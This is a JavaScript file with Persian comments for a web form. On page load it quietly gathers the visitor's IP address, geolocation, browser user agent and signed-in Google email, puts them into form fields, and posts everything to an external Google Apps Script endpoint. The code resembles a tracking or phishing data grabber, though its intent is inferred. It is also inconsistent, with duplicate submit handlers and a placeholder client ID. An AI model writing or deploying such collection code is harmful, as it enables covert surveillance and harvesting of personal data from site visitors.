// تعریف URL اکشن به صورت امن
const scriptURL = "https://script.google.com/macros/s/AKfycbz3Zt1RKpWri8ywsXCmqENWO5O3Pe-rn_QltKfbBdZLPHM3X-Ikz0ami2ETxhtz-677/exec";

// تابع برای دریافت آدرس IP
async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    document.getElementById('ipAddress').value = data.ip;
}

// تابع برای دریافت موقعیت جغرافیایی
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
            document.getElementById('location').value = location;
        });
    }
}

// تابع برای دریافت اطلاعات مرورگر
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    document.getElementById('browserInfo').value = userAgent;
}

// تابع برای دریافت ایمیل کاربر از Google API و پر کردن فیلد ایمیل
function setEmail() {
    gapi.load('client:auth2', function () {
        gapi.auth2.init({ client_id: 'YOUR_GOOGLE_CLIENT_ID' }).then(() => {
            const user = gapi.auth2.getAuthInstance().currentUser.get();
            if (user.isSignedIn()) {
                const email = user.getBasicProfile().getEmail();
                document.getElementById('email').value = email;  // قرار دادن ایمیل در فیلد
            }
        });
    });
}
// تابع برای پر کردن ایمیل از LocalStorage
function autofillEmail() {
    const storedEmail = localStorage.getItem("userEmail");

    if (storedEmail) {
        document.getElementById('email').value = storedEmail;
        // پس از پر شدن ایمیل، فرم رو ارسال می‌کنیم
        document.getElementById('emailForm').submit();
    } else {
        alert("لطفا اطلاعات را به طور صحیح وارد نمایید!");
    }
}

// اضافه کردن رویداد به دکمه
document.getElementById('autoFillEmail').addEventListener('click', autofillEmail);

// تابع برای ذخیره ایمیل وارد شده توسط کاربر
function saveEmail() {
    const email = document.getElementById('email').value;
    if (email) {
        localStorage.setItem("userEmail", email);
    }
}

// افزودن رفتار به دکمه برای پر کردن ایمیل
document.getElementById('autoFillEmail').onclick = function() {
    autofillEmail(); // پر کردن ایمیل در فیلد
};

// افزودن رفتار برای ذخیره ایمیل هنگام ارسال فرم
document.getElementById("myForm").onsubmit = function(event) {
    event.preventDefault(); // جلوگیری از رفتار پیش‌فرض فرم

    // ذخیره ایمیل وارد شده
    saveEmail();

    // دیگر اقدامات برای ارسال فرم
    alert("اطلاعات با موفقیت ارسال شد!");
};


// افزودن رفتار به فرم
document.getElementById("myForm").onsubmit = async function (event) {
    event.preventDefault(); // جلوگیری از رفتار پیش‌فرض فرم

    // دریافت داده‌های فرم
    const formData = new FormData(this);

    try {
        const response = await fetch(scriptURL, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            alert("اطلاعات با موفقیت ارسال شد!");
        } else {
            alert("خطا در ارسال اطلاعات!");
        }
    } catch (error) {
        alert("خطای شبکه!");
        console.error(error);
    }
	
};

// اجرای توابع برای جمع‌آوری اطلاعات
getIPAddress();
getLocation();
getBrowserInfo();
setEmail(); // تنظیم ایمیل در فیلد
